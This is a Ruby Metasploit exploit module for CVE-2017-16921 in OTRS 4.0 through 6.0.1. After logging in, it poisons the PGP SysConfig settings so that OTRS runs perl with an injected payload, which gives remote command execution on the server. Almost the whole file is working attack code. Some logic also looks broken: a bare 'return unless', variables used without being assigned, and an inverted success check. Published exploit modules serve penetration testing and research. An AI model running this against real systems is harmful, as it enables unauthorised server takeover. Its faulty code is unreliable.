##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'OTRS PGP Settings Command Execution',
        'Description' => %q(
          In OTRS 6.0.x up to and including 6.0.1, OTRS 5.0.x up to and including 5.0.24, and OTRS 4.0.x up to and including 4.0.26,
          an attacker who is logged into OTRS as an agent can manipulate form parameters (related to PGP) and execute arbitrary
          shell commands with the permissions of the OTRS or web server user.
          ),
        'Author'      =>
          [
            'h00die', # module
            'BÃ¦ln0rn' # discovery
          ],
        'References'  =>
          [
            [ 'EDB', '43853' ],
            [ 'CVE', '2017-16921' ],
            [ 'URL', 'https://www.otrs.com/security-advisory-2017-09-security-update-otrs-framework/']
          ],
        'License'        => MSF_LICENSE,
        'Arch'           => ARCH_CMD,
        'Platform'       => ['linux', 'unix'],
        'Privileged'     => false,
        'DefaultOptions' => {'SSL' => false},
        'Payload' => {
          'Compat' => {
            'RequiredCmd' => 'perl'
          }
        },
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => 'Dec 05 2017'
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'User to login with', '']),
        OptString.new('PASSWORD', [ false, 'Password to login with', '']),
        OptString.new('TARGETURI', [ true, 'The path to the application', '/otrs/'])
      ], self.class
    )
  end

  def login
    # valid on version 4
    res = send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl'),
      'method'    => 'POST',
      'vars_post' => {
        'Action'       => 'Login',
        'RequestedURL' => '',
        'Lang'         => 'en',
        'TimeOffset'   => '300',
        'User'         => datastore['USERNAME'],
        'Password'     => datastore['PASSWORD']
      }
    )
    if res && res.code == 302
      vprint_good("Login Successful.  Cookie: #{res.get_cookies}")
      return res.get_cookies
    end
    vprint_bad('Invalid Login')
  end

  def poison(cookie, challengetoken, pgp, bin, options)
    res = send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl'),
      'method'    => 'POST',
      'vars_post' => {
        'ChallengeToken' => challengetoken,
        'Action' => 'AdminSysConfig',
        'Subaction' => 'Update',
        'SysConfigGroup' => 'Framework',
        'SysConfigSubGroup' => 'Crypt::PGP',
        'DontWriteDefault' => '1',
        'PGP' => pgp,
        'PGP::Bin' => bin,
        'PGP::Options' => options
      }
    )
    if res.code == 200
      vprint_error('Error saving values')
    end
  end

  def poison_pgp(cookie)
    # we can't use vars_get due to the request using ; instead of & to divide parameters, and it causing issues
    res = send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework'),
      'method'    => 'GET',
      'cookie'   => cookie,
    )
    #vprint_status(res.body)

    #there are MANY items in the form we need to capture, so woohoo to giant regexes!
    form = %r{
      name="ChallengeToken" value="(?<challengetoken>[a-z0-9]+) # challenge token
      .+
      select id="PGP" name="PGP">(?<pgpon>.+)<\/select> # if pgp was on, we have to do follow on processing to pull the toggled option
      .+
      name="PGP::Bin" value="(?<pgpexec>.+)" title # pgp binary
      .+
      name="PGP::Options" value="(?<options>.+)" title=".+" \/> # pgp options
      .+
      name="PGP::Key::PasswordKey\[\]" value="(?<passkey>.+)" title # this can have multiple hits
      .+
      name="PGP::Key::PasswordContent\[\]" value="(?<password>.+)" title # multiple hits again
      .+
      # skip PasswordDeleteNumber[]
      type="checkbox" value="(?<trustedactive>\d)" id="PGP::TrustedNetworkItemActive"
      .+
      select id="PGP::TrustedNetwork" name="PGP::TrustedNetwork">(?<trustedon>.+)<\/select> # we have to do follow on processing to pull the toggled option
      .+
      name="PGP::LogKey\[\]" value="(?<logkey>.+)" title # we have multiple of these to go through most likely
      .+
      name="PGP::LogContent\[\]" value="(?<logcontent>.+)"\/> # multiple
      # skip LogDeleteNumber[]
    }xim

    form_data = res.body.match(form)
    if form_data
      if form_data['challengetoken']
        vprint_status("Challenge: #{form_data['challengetoken']}")
      end
      if form_data['pgpon']
        form_data['pgpon'] = form_data['pgpon'].match(/<option value="([01])" selected="selected">/)
        if pgpon
          vprint_status("PGP turned on: #{form_data['pgpon']}")
        end
      end
      if form_data['pgpexec']
        vprint_status("PGP Exec: #{form_data['pgpexec']}")
      end
      if form_data['options']
        vprint_status("PGP Options: #{form_data['options']}")
      end
      if form_data['passkey']
        for p in form_data['passkey'].each
          vprint_status("PGP Passkey: #{p}")
        end
      end
      if form_data['password']
        for p in form_data['password'].each
          vprint_status("PGP Password: #{p}")
        end
      end
      if form_data['trustedactive']
        vprint_status("Activate Trusted: #{form_data['trustedactive']}")
      end
      if form_data['trustedon']
        form_data['trustedon'] = form_data['trustedon'].match(/<option value="([01])" selected="selected">/)
        if pgpon
          vprint_status("Trusted Network turned on: #{form_data['trustedon']}")
        end
      end
      if form_data['logkey']
        for p in form_data['logkey'].each
          vprint_status("Log Key: #{p}")
        end
      end
      if form_data['logcontent']
        for p in form_data['logcontent'].each
          vprint_status("Log Content: #{p}")
        end
      end

    end


    return unless

    vprint_status('Poisoning PGP parameters')
    poison(cookie, challengetoken, '1', '/usr/bin/perl', " -e '#{payload.encoded}'")
    print('Triggering Exploit')
    send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl'),
      'method'    => 'GET',
      'vars_get' => {
        'Action'       => 'AdminPGP',
      }
    )
    print('Resetting PGP parameters')
    # get a new challenge
    res = send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework'),
      'method'    => 'GET',
      'cookie'   => cookie,
    )
    #need to get challenge token
    challengetoken = res.body.match(/name="ChallengeToken" value="(?<challengetoken>[a-z0-9]+)"/i)
    if challengetoken
      challengetoken = challengetoken['challengetoken']
      vprint_status("Challenge: #{challengetoken}")
    end

    poison(cookie, challengetoken, pgpon, pgpexec, options)

#PGP::StoreDecryptedData=1

  end

  def exploit
    cookie = login
    if cookie
      poison_pgp(cookie)
    end
  end

#  def on_new_session(session)
#    super
#    session.shell_command_token('setsid $SHELL')
#  end
end
